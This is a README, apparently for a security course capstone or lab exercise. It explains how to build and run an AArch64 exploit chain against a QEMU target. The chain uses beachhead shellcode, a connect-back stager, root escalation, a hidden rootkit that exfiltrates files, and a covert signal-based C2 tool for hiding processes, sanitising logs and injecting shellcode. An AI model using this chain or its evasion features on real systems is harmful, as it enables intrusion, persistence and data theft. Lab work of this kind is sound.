# How to Run: kernel-sanders

## Prerequisites

### System Packages
Install the following on your host machine (Debian/Ubuntu/Arch):
```bash
# Debian/Ubuntu
sudo apt install make qemu-system-aarch64 gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu python3

# Arch
sudo pacman -S make qemu-system-aarch64 aarch64-linux-gnu-gcc python
```
### Get the target
The exact target this exploit works is clones in [here](../target-env/).
Replace the files in target-env with the files in this repository (with some extra additions), make kernel header and target image and the follow the building steps.

### Kernel Headers
The rootkit must be compiled against Linux 6.6 AArch64 headers:
```bash
make setup-kernel
# Follow the printed instructions to download/symlink linux-6.6 headers into kernel/
```

### Target VM Image
```bash
make setup-target
# Follow the printed instructions to download the QCOW2 image + kernel Image into target/
```

---

## Building

Build all components (rootkit, exploit, loader, shellcode, tools):
```bash
make
```

Build individual components:
```bash
make lkm        # rootkit.ko
make exploit    # exploit_privesc
make loader     # loader binary
make shellcode  # beachhead.bin
make tools      # mykill
```

---

## Running the Dev VM

Deploy built artifacts to the QEMU shared folder and boot a fresh overlay VM:
```bash
make run
```

This boots an ephemeral overlay so the golden QCOW2 is never modified. To keep changes across reboots:
```bash
make run-persist
```

Inside the VM, artifacts land at `/mnt/shared/capstone/`.

---

## Running the Full Exploit Chain

From your host, against the dev VM (default: `localhost:11337`):
```bash
python3 exploit.py
```

Against the live target over WireGuard:
```bash
python3 exploit.py --lhost <your-wg-ip> --target 10.10.10.1 --rport 1337
```

### What the exploit chain does
| Phase | What Happens |
|-------|-------------|
| 1 | Sends AArch64 beachhead shellcode to the MERIDIAN terminal (`submit` command) — gets code execution as `analyst` |
| 2 | Beachhead connects back; Python serves the patched `stager` binary over TCP into target memory |
| 3 | Stager runs in-memory, connects back on a second port; Python delivers `exploit_privesc`, `loader`, and `rootkit.ko` — escalates to root, loads rootkit without insmod, exfiltrates PIR files |
| 4 | Interactive root shell over the existing socket; tools (`mykill`) pushed into hidden vaults |

### exploit.py arguments
| Argument | Default | Description |
|----------|---------|-------------|
| `--lhost` | `10.0.2.2` | Attacker IP the target connects back to |
| `--lport` | `4444` | Attacker port for beachhead callback |
| `--target` | `localhost` | MERIDIAN host |
| `--rport` | `11337` | MERIDIAN port |
| `--init-task` | `0xffff800082af4ac0` | `init_task` kernel address (from System.map) |
| `--noprtr` | false | Skip rootkit protections (no magic GID grant) |
| `--injector` | `tools/inject_test.bin` | Injection shellcode to push to target |

---

## Running Tests

Automated end-to-end test against a fresh VM:
```bash
make test
```

Interactive tests inside the VM (after `make run`):
```bash
make test-lkm           # all LKM feature tests
make test-lkm-<name>    # single test by name
make test-chain         # full attack chain test
make test-challenges    # challenge flag tests
```

Test scripts live in `test/`. Individual test case specs are in `documentation/test-cases/`.

---

## Controlling the Rootkit (C2)

Once the rootkit is loaded, use `mykill` to send commands over the covert C2 channel (signal 62):

```bash
./mykill status          # print current rootkit state to dmesg
./mykill toggle-hide     # toggle file hiding
./mykill toggle-block    # toggle path access blocking
./mykill toggle-proc     # toggle process hiding
./mykill toggle-log      # toggle dmesg log sanitization
./mykill add-gid <pid>   # grant magic GID (operator bypass) to process
./mykill inject <pid>    # inject shellcode into target PID
```

To check the rootkit is running:
```bash
make status
```

---

## Submission

Build the submission archive:
```bash
make submission.zip
```

Submits: `lkm/src/`, `exploit/`, `loader/`, `shellcode/`, `writeup/`, Makefiles.
